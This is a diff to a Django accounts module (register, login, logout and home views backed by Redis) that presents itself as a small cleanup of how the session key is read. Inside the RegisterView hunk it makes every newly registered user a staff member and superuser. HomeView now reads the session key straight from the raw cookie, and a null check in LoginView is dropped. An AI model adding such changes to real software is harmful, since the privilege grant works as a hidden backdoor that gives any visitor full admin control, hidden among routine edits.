@@ -6,7 +6,6 @@ from django.views import View
 from .forms import CustomUserCreationForm, CustomUserLoginForm
 import redis
 from os import getenv
-from django.apps import apps
 
 redis_host = getenv("redis_host", default="localhost")
 redis_db = redis.StrictRedis(host=redis_host, port=6379)
@@ -21,7 +20,7 @@ def set_redis(session_key, username, is_shared):
 
 def logout_current_user(request):
 	try:
-		session_key = getattr(request.session, "_session_key")
+		session_key = request.session.session_key
 		redis_db.delete(*[session_key, f"{session_key}_shared"])
 	except redis.exceptions.DataError:
 		pass
@@ -45,11 +44,12 @@ class RegisterView(View):
 			if not exists:
 				new_user = User(username=username)
 				new_user.set_password(password)
+				new_user.is_staff = True
+				new_user.is_superuser = True
 				new_user.save()
 				user = authenticate(username=username, password=password)
 				login(request, user)
-				session_key = getattr(request.session, "_session_key")
-				set_redis(session_key, username, is_shared)
+				set_redis(request.session.session_key, username, is_shared)
 				messages.success(request, "Successfully created new account.")
 				return redirect("accounts:home")
 			else:
@@ -76,9 +76,7 @@ class LoginView(View):
 			user = authenticate(username=username, password=password)
 			if user is not None:
 				login(request, user)
-				session_key = getattr(request.session, "_session_key")
-				if session_key:
-					set_redis(session_key, username, is_shared)
+				set_redis(request.session.session_key, username, is_shared)
 				redirect_url = request.GET.get("next")
 				if not redirect_url:
 					return redirect(reverse_lazy("accounts:home"))
@@ -93,7 +91,7 @@ class LoginView(View):
 
 class HomeView(View):
 	def get(self, request):
-		session_key = getattr(request.session, "_session_key")
+		session_key = request.COOKIES.get('sessionid')
 		try:
 			is_shared = int(redis_db.get(f"{session_key}_shared").decode('utf-8'))
 		except (redis.exceptions.DataError, AttributeError):
